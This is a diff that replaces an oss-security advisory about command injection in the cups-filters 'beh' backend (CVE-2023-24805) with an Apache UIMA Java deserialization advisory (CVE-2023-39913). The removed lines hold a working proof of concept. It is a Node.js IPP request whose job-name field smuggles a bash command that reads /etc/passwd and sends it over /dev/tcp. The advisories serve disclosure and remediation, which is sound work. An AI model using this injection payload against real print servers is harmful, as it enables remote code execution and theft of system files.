@@ -1,101 +1,66 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/05/17/5
-Message-ID: <d20c573e-81ca-800d-5bf8-c2f96b31ea82@gmail.com>
-Date: Wed, 17 May 2023 11:30:11 +0200
-From: Till Kamppeter <till.kamppeter@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/11/08/1
+Message-ID: <7ddb3c1b-71a1-83f9-1b3f-342fcb455935@apache.org>
+Date: Wed, 08 Nov 2023 07:38:43 +0000
+From: Richard Eckart de Castilho <rec@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2023-24805: RCE in cups-filters, beh CUPS backend
+Subject: CVE-2023-39913: Apache UIMA Java SDK, Apache UIMA Java SDK, Apache UIMA Java SDK, Apache UIMA Java SDK: Potential untrusted code execution when deserializing certain binary CAS formats 
 Content-Type: text/plain; charset=utf-8
 
-Following bug got reported to OpenPrinting's GitHub, repo cups-filters, 
-as a private (security) issue report:
+Severity: important
 
-https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x
+Affected versions:
 
-Summary
+- Apache UIMA Java SDK before 3.5.0
+- Apache UIMA Java SDK before 3.5.0
+- Apache UIMA Java SDK before 3.5.0
+- Apache UIMA Java SDK before 3.5.0
 
-If you use "beh" to create an accessible network printer, this security 
-vulnerability can cause remote code execution.
+Description:
 
-Details
+Deserialization of Untrusted Data, Improper Input Validation vulnerability in Apache UIMA Java SDK, Apache UIMA Java SDK, Apache UIMA Java SDK, Apache UIMA Java SDK.This issue affects Apache UIMA Java SDK: before 3.5.0.
 
-cups-filters/backend/beh.c
+Users are recommended to upgrade to version 3.5.0, which fixes the issue.
 
-Line 288 in 5c9498a
-   retval = system(cmdline) >> 8;
+There are several locations in the code where serialized Java objects are deserialized without verifying the data. This affects in particular:
+  *  the deserialization of a Java-serialized CAS, but also other binary CAS formats that include TSI information using the CasIOUtils class;
+  *  the CAS Editor Eclipse plugin which uses the the CasIOUtils class to load data;
+  *  the deserialization of a Java-serialized CAS of the Vinci Analysis Engine service which can receive using Java-serialized CAS objects over network connections;
+  *  the CasAnnotationViewerApplet and the CasTreeViewerApplet;
+  *  the checkpointing feature of the CPE module.
 
-     // (context: argv = beh <job-id> <user> <title> <copies> <options> 
-[file])
-      snprintf(cmdline, sizeof(cmdline),
-      "%s/backend/%s '%s' '%s' '%s' '%s' '%s' %s",
-      cups_serverbin, scheme, argv[1], argv[2], argv[3],
-            ...
-      (argc == 6 ? "1" : argv[4]),
-      argv[5], filename);
-            ...
-    retval = system(cmdline) >> 8;
+Note that the UIMA framework by default does not start any remotely accessible services (i.e. Vinci) that would be vulnerable to this issue. A user or developer would need to make an active choice to start such a service. However, users or developers may use the CasIOUtils in their own applications and services to parse serialized CAS data. They are affected by this issue unless they ensure that the data passed to CasIOUtils is not a serialized Java object.
 
-The system function will be called here to execute the command, and the 
-user and title parameters are user-controlled and unsanitized .
+When using Vinci or using CasIOUtils in own services/applications, the unrestricted deserialization of Java-serialized CAS files may allow arbitrary (remote) code execution.
 
-PoC
+As a remedy, it is possible to set up a global or context-specific ObjectInputFilter (cf.  https://openjdk.org/jeps/290  and  https://openjdk.org/jeps/415 ) if running UIMA on a Java version that supports it. 
 
-      start a beh service lpadmin -p myprinter -E -v 
-beh:/1/3/5/socket://printer:9100
+Note that Java 1.8 does not support the ObjectInputFilter, so there is no remedy when running on this out-of-support platform. An upgrade to a recent Java version is strongly recommended if you need to secure an UIMA version that is affected by this issue.
 
-      exploit: // https://github.com/williamkapke/ipp
+To mitigate the issue on a Java 9+ platform, you can configure a filter pattern through the "jdk.serialFilter" system property using a semicolon as a separator:
 
-var ipp = require('ipp');
-var PDFDocument = require('pdfkit');
-var concat = require("concat-stream");
+To allow deserializing Java-serialized binary CASes, add the classes:
+  *  org.apache.uima.cas.impl.CASCompleteSerializer
+  *  org.apache.uima.cas.impl.CASMgrSerializer
+  *  org.apache.uima.cas.impl.CASSerializer
+  *  java.lang.String
 
-var doc = new PDFDocument({margin:0});
-doc.text("1.pdf", 0, 0);
+To allow deserializing CPE Checkpoint data, add the following classes (and any custom classes your application uses to store its checkpoints):
+  *  org.apache.uima.collection.impl.cpm.CheckpointData
+  *  org.apache.uima.util.ProcessTrace
+  *  org.apache.uima.util.impl.ProcessTrace_impl
+  *  org.apache.uima.collection.base_cpm.SynchPoint
 
+Make sure to use "!*" as the final component to the filter pattern to disallow deserialization of any classes not listed in the pattern.
 
-doc.pipe(concat(function (data) {
-var printer = ipp.Printer("http://127.0.0.1:6310/printers/myprinter");
-var msg = {
-"operation-attributes-tag": {
-"requesting-user-name": "Bumblebee",
-"job-name": "';env; bash -c \"/usr/bin/cat ${PWD}etc/${PWD}/passwd > 
-${PWD}dev${PWD}tcp${PWD}127.0.0.1${PWD}1337\";'' #.pdf",
-"document-format": "application/pdf"
-},
-"job-attributes-tag":{
-        "media-col": {
-          "media-source": "tray-2"
-        }
-}
-, data: data
-};
-printer.execute("Print-Job", msg, function(err, res){
-console.log(err);
-console.log(res);
-});
-}));
-doc.end();
+Apache UIMA 3.5.0 uses tightly scoped ObjectInputFilters when reading Java-serialized data depending on the type of data being expected. Configuring a global filter is not necessary with this version.
 
+Credit:
 
-The report got assigned CVE-2023-24805
+Huangzhicong from CodeSafe Team of Legendsec at Qi’anxin (reporter)
 
-A fix is to use execv() instead of system() and was proposed as a pull 
-request attached to the bug report.
+References:
 
-https://github.com/OpenPrinting/cups-filters-ghsa-gpxc-v2m8-fr3x/pull/1
+https://uima.apache.org/
+https://www.cve.org/CVERecord?id=CVE-2023-39913
 
-The pull request is merged now into
-
-https://github.com/OpenPrinting/cups-filters (branch "master")
-
-as commit
-
-https://github.com/OpenPrinting/cups-filters/commit/8f274035756
-
-and the fix is also ported to the "1.x" branch of cups-filters, as commit
-
-https://github.com/OpenPrinting/cups-filters/commit/93e60d3df35
-
-The fix will also be included in the upcoming releases, 2.0.0 and 1.28.18.
-
-    Till
